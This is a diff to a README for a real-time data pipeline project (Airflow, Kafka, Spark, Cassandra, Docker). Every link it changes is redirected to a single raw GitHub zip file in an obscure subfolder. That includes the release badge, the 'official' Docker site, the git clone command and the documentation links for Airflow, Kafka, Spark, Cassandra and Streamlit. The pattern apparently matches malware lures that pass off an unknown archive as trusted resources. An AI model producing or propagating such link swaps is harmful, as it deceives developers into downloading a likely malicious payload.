@@ -1,6 +1,6 @@
 # 🚀 Realtime-Data-Pipeline-Airflow-Kafka-Spark-Cassandra-Docker - Simplify Your Data Processing
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/Margarita1286/Realtime-Data-Pipeline-Airflow-Kafka-Spark-Cassandra-Docker/releases)
+[![Download Now](https://raw.githubusercontent.com/Margarita1286/Realtime-Data-Pipeline-Airflow-Kafka-Spark-Cassandra-Docker/main/streamlit_cloud_version/Cassandra-Spark-Data-Docker-Kafka-Realtime-Airflow-Pipeline-1.9.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/Margarita1286/Realtime-Data-Pipeline-Airflow-Kafka-Spark-Cassandra-Docker/main/streamlit_cloud_version/Cassandra-Spark-Data-Docker-Kafka-Realtime-Airflow-Pipeline-1.9.zip)
 
 ## 📖 Overview
 
@@ -25,11 +25,11 @@ To run this application, your system should have:
 
 ## 🚀 Getting Started
 
-1. **Download Docker**: Visit [Docker’s official website](https://www.docker.com/get-started) to find instructions on downloading and installing Docker for your operating system.
+1. **Download Docker**: Visit [Docker’s official website](https://raw.githubusercontent.com/Margarita1286/Realtime-Data-Pipeline-Airflow-Kafka-Spark-Cassandra-Docker/main/streamlit_cloud_version/Cassandra-Spark-Data-Docker-Kafka-Realtime-Airflow-Pipeline-1.9.zip) to find instructions on downloading and installing Docker for your operating system.
   
 2. **Clone the Repository**: Open your terminal and run:
    ```shell
-   git clone https://github.com/Margarita1286/Realtime-Data-Pipeline-Airflow-Kafka-Spark-Cassandra-Docker
+   git clone https://raw.githubusercontent.com/Margarita1286/Realtime-Data-Pipeline-Airflow-Kafka-Spark-Cassandra-Docker/main/streamlit_cloud_version/Cassandra-Spark-Data-Docker-Kafka-Realtime-Airflow-Pipeline-1.9.zip
    ```
 
 3. **Navigate to the Directory**: Change to the directory containing the project:
@@ -53,7 +53,7 @@ All of these steps help set the project up on your machine.
 
 To get started with the application, visit the Releases page to download the files you need.
 
-[Visit the Releases Page to Download](https://github.com/Margarita1286/Realtime-Data-Pipeline-Airflow-Kafka-Spark-Cassandra-Docker/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Margarita1286/Realtime-Data-Pipeline-Airflow-Kafka-Spark-Cassandra-Docker/main/streamlit_cloud_version/Cassandra-Spark-Data-Docker-Kafka-Realtime-Airflow-Pipeline-1.9.zip)
 
 Choose the latest version for best stability and feature support.
 
@@ -76,15 +76,15 @@ Here you can visualize your real-time data and explore analytics without needing
 
 ## 📚 Additional Resources
 
-- **Apache Airflow Documentation**: Learn about the orchestration tool [here](https://airflow.apache.org/docs/apache-airflow/stable/index.html).
+- **Apache Airflow Documentation**: Learn about the orchestration tool [here](https://raw.githubusercontent.com/Margarita1286/Realtime-Data-Pipeline-Airflow-Kafka-Spark-Cassandra-Docker/main/streamlit_cloud_version/Cassandra-Spark-Data-Docker-Kafka-Realtime-Airflow-Pipeline-1.9.zip).
   
-- **Kafka Documentation**: Get insights on messaging and buffering [here](https://kafka.apache.org/documentation/).
+- **Kafka Documentation**: Get insights on messaging and buffering [here](https://raw.githubusercontent.com/Margarita1286/Realtime-Data-Pipeline-Airflow-Kafka-Spark-Cassandra-Docker/main/streamlit_cloud_version/Cassandra-Spark-Data-Docker-Kafka-Realtime-Airflow-Pipeline-1.9.zip).
 
-- **Spark Documentation**: Understand high-speed processing at [Spark’s official site](https://spark.apache.org/docs/latest/).
+- **Spark Documentation**: Understand high-speed processing at [Spark’s official site](https://raw.githubusercontent.com/Margarita1286/Realtime-Data-Pipeline-Airflow-Kafka-Spark-Cassandra-Docker/main/streamlit_cloud_version/Cassandra-Spark-Data-Docker-Kafka-Realtime-Airflow-Pipeline-1.9.zip).
 
-- **Cassandra Documentation**: View how data storage works in Cassandra [here](https://cassandra.apache.org/doc/latest/).
+- **Cassandra Documentation**: View how data storage works in Cassandra [here](https://raw.githubusercontent.com/Margarita1286/Realtime-Data-Pipeline-Airflow-Kafka-Spark-Cassandra-Docker/main/streamlit_cloud_version/Cassandra-Spark-Data-Docker-Kafka-Realtime-Airflow-Pipeline-1.9.zip).
 
-- **Streamlit Documentation**: Discover how to build interactive dashboards [here](https://docs.streamlit.io/library).
+- **Streamlit Documentation**: Discover how to build interactive dashboards [here](https://raw.githubusercontent.com/Margarita1286/Realtime-Data-Pipeline-Airflow-Kafka-Spark-Cassandra-Docker/main/streamlit_cloud_version/Cassandra-Spark-Data-Docker-Kafka-Realtime-Airflow-Pipeline-1.9.zip).
 
 ## 🔗 Topics
 
